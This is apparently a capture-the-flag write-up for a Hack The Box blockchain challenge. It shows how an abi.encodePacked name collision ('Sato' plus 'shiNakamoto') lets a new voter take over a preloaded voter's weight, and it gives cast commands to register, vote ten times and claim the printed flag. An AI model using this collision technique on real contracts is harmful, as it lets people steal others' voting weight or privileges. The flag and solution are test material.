> NotADemocraticElection - Blockchain
> Easy
>In the post-apocalyptic wasteland, the remnants of human and machine factions vie for control over the last vestiges of civilization. The Automata Liberation Front (ALF) and the Cyborgs Independence Movement (CIM) are the two primary parties seeking to establish dominance. In this harsh and desolate world, democracy has taken a backseat, and power is conveyed by wealth. Will you be able to bring back some Democracy in this hopeless land?

On doit faire en sorte qu'un certain parti politique gagne et que ses votes atteignent 1000 * 10^18 (notons que 10^18 wei = 1ether).

# Recon

## Code reading

**add code extracts**

- you can register to vote by submitting your name and surname, and if you transfer ether your vote will carry more weight (I'm getting a kick out of this representation of corruption)
- when the contract is initialized, there's a member who's already registered with 100 ether = 100 * 10^18 (they can whippin everything by casting just 10 votes)
- his name is Satoshi Nakamoto
- Of course, you can't vote for someone else - there's a verification process based on the address that REGISTERED the person and the address that CARRIED out the vote.
- If the address is verified, the code will take the voter's first and last name signature by doing: abiEncodePacked(first name, last name)
- except that this function is vulnerable in that if I register a person called "Sato shiNakamoto", his signature will be the same as that of "Satoshi Nakamoto" (everything is concatenated).
- Documentation mentioning the https://docs.soliditylang.org/en/latest/abi-spec.html flaw
- Then all I have to do is vote with the fraudulent voter I've just created


# Resolution

Steps to resolve: 

- Start the instance and retrieve the addresses
- Make a call to depositVoteCollatoral with the following parameters: "Sato" "shiNakamoto" (could have been "Sat" "oshiNakamoto" etc)
- Vote 10 times
- Claim the flag

in commands it looks like this: 

`cast send $TARGET -r $RPC_URL --from $ATTACKER --private-key $PRIVATE_KEY "depositVoteCollateral(string,string)" Sato shiNakamoto`

- We vote for our favorite party 10 times: `cast send $TARGET --private-key $PRIVATE_KEY -r $RPC_URL "vote(bytes3,string,string)" 0x43494d Sato shiNakamoto` (execute the command 1 time like a golmon, we're not scripting here)

- You can check the number of votes with `cast call $TARGET -r $RPC_URL "getVotesCount(bytes3)" 0x43494d`.

`HTB{h4sh_c0ll1s10n_t0_br1ng_b4ck_d3m0cr4cy}`
